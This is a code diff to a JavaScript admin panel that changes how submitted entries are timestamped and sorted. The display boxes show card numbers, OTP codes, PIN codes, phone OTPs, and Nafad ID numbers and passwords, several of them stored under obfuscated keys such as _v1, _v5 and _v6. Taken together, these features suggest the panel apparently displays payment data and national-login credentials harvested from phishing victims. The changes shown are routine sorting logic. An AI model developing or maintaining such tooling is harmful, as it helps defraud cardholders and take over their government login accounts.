@@ -2050,6 +2050,7 @@ const renderNafadBox = () => {
       // Use entry ID as unique base timestamp to ensure stable ordering
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 0;
+      // Use submittedAt from database entry, fallback to entry's own timestamp
       const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
       const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
@@ -2273,7 +2274,9 @@ const renderNafadBox = () => {
       const cardNumber = raw._v1 || raw.cardNumber;
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 1;
-      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      // Use _v1UpdatedAt if available, otherwise use submittedAt
+      const _v1Timestamp = raw._v1UpdatedAt ? new Date(raw._v1UpdatedAt).getTime() : 0;
+      const baseTimestamp = _v1Timestamp || entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
       const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
@@ -2372,7 +2375,9 @@ const renderNafadBox = () => {
       const otpCode = raw._v5 || raw.otpCode;
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 2;
-      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      // Use _v5UpdatedAt if available, otherwise use submittedAt
+      const _v5Timestamp = raw._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() : 0;
+      const baseTimestamp = _v5Timestamp || entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
       const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
@@ -2450,7 +2455,9 @@ const renderNafadBox = () => {
       const pinCode = raw._v6 || raw.pinCode;
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 3;
-      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      // Use _v6UpdatedAt if available, otherwise use submittedAt
+      const _v6Timestamp = raw._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() : 0;
+      const baseTimestamp = _v6Timestamp || entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
       const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
@@ -2528,7 +2535,9 @@ const renderNafadBox = () => {
       const hasPhone = raw.phoneNumber || raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 4;
-      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      // Use _v7UpdatedAt if available, otherwise use submittedAt
+      const _v7Timestamp = raw._v7UpdatedAt ? new Date(raw._v7UpdatedAt).getTime() : 0;
+      const baseTimestamp = _v7Timestamp || entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
       const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
@@ -2627,7 +2636,9 @@ const renderNafadBox = () => {
       const hasNafad = raw.nafadIdNumber || raw.nafadPassword;
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 5;
-      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      // Use nafadUpdatedAt if available, otherwise use submittedAt
+      const nafadTimestamp = raw.nafadUpdatedAt ? new Date(raw.nafadUpdatedAt).getTime() : 0;
+      const baseTimestamp = nafadTimestamp || entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
       const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
